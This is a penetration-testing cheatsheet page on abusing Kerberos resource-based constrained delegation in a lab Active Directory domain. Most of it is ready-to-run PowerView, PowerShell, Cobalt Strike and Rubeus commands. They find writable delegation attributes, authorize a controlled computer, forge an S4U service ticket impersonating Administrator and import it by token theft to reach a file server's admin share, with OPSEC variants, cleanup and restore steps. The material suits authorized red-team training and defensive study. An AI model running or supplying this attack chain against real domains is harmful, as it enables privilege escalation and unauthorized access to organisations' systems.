---
title: "Kerberos Resource-Based Constrained Delegation"
description: "Identify write access to a back-end RBCD attribute, preserve its existing configuration, add a controlled computer, request a service ticket and restore the original state."
category: "Kerberos"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF", "PowerView", "ActiveDirectory PowerShell"]
updated: 2026-11-15
tags: ["kerberos", "rbcd", "delegation", "active-directory"]
draft: false
---

## 1. Why the attack works

Resource-based constrained delegation puts the trust decision on the **back-end account**. Its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute contains a security descriptor identifying principals allowed to act on behalf of users to that resource.

If an identity can modify that attribute and also controls a service principal, it can authorize that principal as a front end. The controlled front end then uses S4U to obtain a ticket to the back end as an eligible user.

| Requirement | Lab example |
|---|---|
| Write access to the back-end attribute | `rsteel`, via Server Admins, can modify `lon-fs-1` |
| Controlled account with an SPN | `LON-WKSTN-1$`, with its usable TGT |
| Reachable directory and KDC | `lon-dc-1` |
| Eligible impersonated identity | `Administrator`, with the required target permissions |

Unlike classic protocol-transition delegation, this RBCD path does not require `TRUSTED_TO_AUTH_FOR_DELEGATION` on the front end. Account protections and KDC policy still apply. Control of the front end alone does not grant permission to configure a back end's RBCD attribute.

## 2. Discover attribute-specific write access

Run PowerView in a domain-authenticated PowerShell session with directory connectivity. If using the lab SOCKS/Proxifier setup, establish routing and DNS first; a proxy alone does not create an authenticated directory context.

```powershell
Import-Module C:\Tools\PowerSploit\Recon\PowerView.ps1
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | Where-Object { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -match 'WriteProperty' } | Select-Object ObjectDN,SecurityIdentifier
Get-DomainObject -LDAPFilter '(objectSid=<ACE_TRUSTEE_SID>)' -Server 'lon-dc-1'
```

The GUID identifies the RBCD attribute. This is a candidate filter, not a complete effective-permissions calculation: inspect inheritance, deny ACEs, group membership, and broader rights such as GenericWrite or GenericAll. Resolving a SID to Server Admins does not prove that the current identity belongs to that group.

Continue in the session authenticated as the identity that actually has write access, `rsteel` in the lab. Import the ActiveDirectory module for `Get-ADComputer` and `Set-ADComputer`.

## 3. Inspect and back up the original state

The following change/restore sequence stays in the **same PowerShell session**. Save the backup file if cleanup must survive a disconnected session.

```powershell
Import-Module ActiveDirectory
$dc = 'lon-dc-1'
$target = 'lon-fs-1'
$attribute = 'msDS-AllowedToActOnBehalfOfOtherIdentity'
$before = Get-ADComputer -Identity $target -Server $dc -Properties $attribute,PrincipalsAllowedToDelegateToAccount
$before | Select-Object Name,PrincipalsAllowedToDelegateToAccount
$originalDescriptor = $before.$attribute
$before | Export-Clixml -Path .\lon-fs-1-rbcd-before.xml
```

In the supplied lab, `lon-ws-1` is already allowed. Preserve that entry. The explicit two-computer command below is valid only after confirming it represents the complete intended principal set; do not replace a larger list with this example.

## 4. Add the controlled computer

```powershell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server $dc
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server $dc
Set-ADComputer -Identity $target -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server $dc
Get-ADComputer -Identity $target -Properties PrincipalsAllowedToDelegateToAccount -Server $dc | Select-Object Name,PrincipalsAllowedToDelegateToAccount
# Expected lab list: existing LON-WS-1 plus added LON-WKSTN-1.
```

This changes directory configuration. It does not create a ticket or establish a session by itself. Keep the original security descriptor for restoration rather than reconstructing it from memory.

## 5. Obtain the controlled front-end TGT and request CIFS

From an elevated Beacon on **lon-wkstn-1**, extract and verify the computer TGT. This is the computer just added to the target's allowed principals, not the target's own TGT.

```shell
beacon> krb_dump /luid:3e7 /service:krbtgt
# Confirm the client is LON-WKSTN-1$.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:<WKSTN1_TGT_BASE64> /dc:lon-dc-1 /nowrap
# Keep the final Administrator -> cifs/lon-fs-1 ticket.
```

```shell
# OPSEC Alternative
beacon> krb_s4u /ticket:<WKSTN1_TGT_BASE64> /service:cifs/lon-fs-1 /impersonateuser:Administrator /dc:lon-dc-1
```

## Use the resulting service ticket

Use the **final service ticket**, not the front-end TGT or intermediate S4U2self ticket. Create a separate network-only process, record its returned PID, and select that token in Beacon. `FakePass` is a placeholder for the network-only session; the imported ticket supplies Kerberos authentication.

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
# Record ProcessID and verify that ticket import succeeded.
beacon> steal_token <PID>
beacon> run klist
# Client: Administrator @ CONTOSO.COM
# Server: cifs/lon-fs-1 @ CONTOSO.COM
beacon> ls \\lon-fs-1\c$
```

A ticket proves an identity to a service; it does not grant permissions absent from that identity. Use the hostname matching the ticket, not an IP address.

## Ticket import alternatives

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
beacon> ls \\lon-fs-1\c$
```

## Session cleanup

Purge only the disposable session while its token is selected, then revert and terminate the process created for this test. Do not purge an unrelated user's cache.

```shell
# Native cleanup
beacon> kerberos_ticket_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <PID>
```

## Restore the original RBCD configuration

Back in the PowerShell session used to modify the directory, restore the saved attribute bytes. If the attribute was originally unset, clear it. Coordinate restoration if another administrator changed it during the exercise; blindly restoring an old snapshot could erase their update.

```powershell
if ($null -eq $originalDescriptor) {
    Set-ADComputer -Identity $target -Clear $attribute -Server $dc
} else {
    $restore = @{}
    $restore[$attribute] = $originalDescriptor
    Set-ADComputer -Identity $target -Replace $restore -Server $dc
}
Get-ADComputer -Identity $target -Properties PrincipalsAllowedToDelegateToAccount -Server $dc | Select-Object Name,PrincipalsAllowedToDelegateToAccount
# Lab result should again contain only the original LON-WS-1 entry.
```

Restoring the attribute stops the newly configured delegation path but does not automatically remove service tickets already issued; complete the ticket/session cleanup too.

## Troubleshooting

| Symptom | Check |
|---|---|
| Attribute write denied | Effective identity, target ACL, inheritance and deny entries |
| S4U2proxy denied | RBCD entry, controlled principal SID, user restrictions and KDC policy |
| Wrong client TGT | Use the newly authorized front end, not an unrelated host |
| Existing delegation disappears | The setter replaced the list; restore the saved original configuration |
| PowerShell command missing | PowerView versus ActiveDirectory module and their distinct command sets |

## Quick checklist

```text
ENUMERATE AND PRESERVE
[ ] Identify effective write access to the target's msDS-AllowedToActOnBehalfOfOtherIdentity.
[ ] Resolve the ACE trustee and verify the current identity's actual group membership and rights.
[ ] Confirm control of a front-end principal with an SPN and usable TGT.
[ ] Read the target's existing allowed principals and save the original security descriptor.
[ ] Preserve all existing entries when adding the controlled principal.
[ ] Re-read the attribute and verify the intended change.

REQUEST THE BACK-END TICKET
[ ] Extract the TGT of the newly authorized front end: LON-WKSTN-1$ in this lab.
[ ] krb_s4u /ticket:<WKSTN1_TGT_BASE64> /service:cifs/lon-fs-1 /impersonateuser:Administrator /dc:lon-dc-1
[ ] Rubeus alternative: s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:<WKSTN1_TGT_BASE64> /dc:lon-dc-1 /nowrap.
[ ] Keep the final Administrator -> cifs/lon-fs-1 service ticket.

IMPORT AND VERIFY — CHOOSE ONE PATH
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
# Rubeus Alternative
[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
[ ] run klist -> verify the selected session, client identity, target and expiry.
[ ] ls \\lon-fs-1\c$ -> verify actual service authorization.

CLEANUP
[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
[ ] rev2self -> restore the original token.
[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
[ ] Restore the original RBCD attribute, or clear it only if originally unset.
[ ] Re-read allowed principals and verify that existing delegation was preserved.
```

## Related references

- [Constrained delegation](/cheatsheets/kerberos-constrained-delegation-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
- [Microsoft: resource-side delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Rubeus S4U](https://github.com/GhostPack/Rubeus#s4u)
